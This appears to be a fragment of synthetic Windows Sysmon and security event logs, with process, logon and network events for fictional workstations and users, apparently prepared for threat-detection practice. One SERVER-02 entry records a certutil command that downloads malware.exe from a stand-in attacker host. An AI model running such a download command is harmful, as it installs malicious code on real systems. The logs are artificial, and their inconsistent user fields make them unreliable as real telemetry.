  {
    "EventID": 1,
    "Computer": "WORKSTATION-02",
    "UserName": "SYSTEM",
    "UtcTime": "2024-03-03T09:03:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "CommandLine": "chrome.exe --type=renderer",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "5855",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=782e37f2c22ea92829d85ba7bf640d88760bffb21b5eaa048d7621dbb425d2c3"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-05",
    "UserName": "charlie",
    "UtcTime": "2024-03-11T07:17:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "CommandLine": "chrome.exe --type=renderer",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\alice",
      "ProcessId": "6563",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=294f38a59b2d7e3b354c7f25af14bc437c114116931367cb910a48917df6b73a"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-06",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-10T01:27:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "CommandLine": "explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "1398",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=6ac7b59e7a735c7a96817161ebab83ae520d9850bb108ec8ed40ae7ee02365c4"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-07",
    "UserName": "svc_backup",
    "UtcTime": "2024-03-16T01:38:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "CommandLine": "chrome.exe --type=renderer",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "5632",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=52c32458d67fe8593d30cdc2bba5e8c013cf77f32d9878d7a235ac0482953496"
    }
  },
  {
    "EventID": 1,
    "Computer": "SERVER-02",
    "UserName": "SYSTEM",
    "UtcTime": "2024-03-01T11:14:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\certutil.exe",
      "CommandLine": "certutil.exe -urlcache -split -f http://attacker.com/malware.exe malware.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "7468",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=b0521c844a2631ee28eb6a74e5cfa0df310c650de781aff3671d6c9f1882d0dd"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-01",
    "UserName": "dave",
    "UtcTime": "2024-03-08T05:53:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\explorer.exe",
      "CommandLine": "explorer.exe",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\administrator",
      "ProcessId": "5052",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=eaa4ef00b87b39f1ae176fd605b85746492be13e6d8d39c3f29d0b65b3ba4ab1"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-02",
    "UserName": "dave",
    "UtcTime": "2024-03-16T06:58:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Chrome\\chrome.exe",
      "CommandLine": "chrome.exe --type=renderer",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\SYSTEM",
      "ProcessId": "7465",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=0a0a1b858055df1e8efa6f071144baf0320f628b8a3a5f9cf3ed06d964f4292b"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-06",
    "UserName": "charlie",
    "UtcTime": "2024-03-16T00:58:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\svchost.exe",
      "CommandLine": "svchost.exe -k netsvcs -p -s Schedule",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\charlie",
      "ProcessId": "8396",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=3cdca357b29cd0decfa2b0847dcd2c919b51d634da8a55b04f90f320171da661"
    }
  },
  {
    "EventID": 4624,
    "Computer": "SERVER-02",
    "UserName": "charlie",
    "UtcTime": "2024-03-25T22:17:00Z",
    "EventData": {
      "SubjectUserName": "administrator",
      "SubjectDomainName": "CORP"
    }
  },
  {
    "EventID": 3,
    "Computer": "WORKSTATION-03",
    "UtcTime": "2024-03-29T20:27:00Z",
    "EventData": {
      "Image": "C:\\Program Files\\Windows Defender\\MsMpEng.exe",
      "DestinationIp": "10.0.0.201",
      "DestinationPort": 80,
      "Protocol": "tcp",
      "Initiated": "true",
      "SourceIp": "10.0.0.105",
      "SourcePort": "52505"
    }
  },
  {
    "EventID": 1,
    "Computer": "WORKSTATION-05",
    "UserName": "dave",
    "UtcTime": "2024-03-27T11:20:00Z",
    "EventData": {
      "Image": "C:\\Windows\\System32\\taskhostw.exe",
      "CommandLine": "taskhostw.exe SYSTEM",
      "ParentImage": "C:\\Windows\\explorer.exe",
      "ParentCommandLine": "explorer.exe",
      "User": "CORP\\svc_backup",
      "ProcessId": "3869",
      "IntegrityLevel": "High",
      "Hashes": "SHA256=0ad0e56da946727d3356f4bceb8697d0a41745dd5155b7b22eed3b0923d9e629"
    }
  }
]